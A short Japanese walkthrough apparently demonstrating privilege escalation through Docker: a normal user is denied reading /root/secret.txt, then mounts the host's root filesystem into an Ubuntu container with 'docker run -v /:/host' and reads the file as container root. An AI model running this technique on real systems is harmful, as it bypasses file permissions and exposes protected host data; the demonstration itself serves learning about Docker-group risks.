## /rootに検証用のファイルを作成

```bash
banister@~/projects/OreshicRecord vuln$ echo 'root only'
```

```
root only
```

## 一般ユーザーでは開けないことの確認

```bash
banister@~/projects/OreshicRecord vuln$ cat /root/secret.txt
```

```
cat: /root/secret.txt: 許可がありません
```

## ホストの/をコンテナ内の/hostにマウントして起動

```bash
banister@~/projects/OreshicRecord vuln$ docker run -it -v /:/host ubuntu
```

```
root@e62ea093e534:/# ls /host
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var

root@e62ea093e534:/# cat /host/root/secret.txt 
root only
```

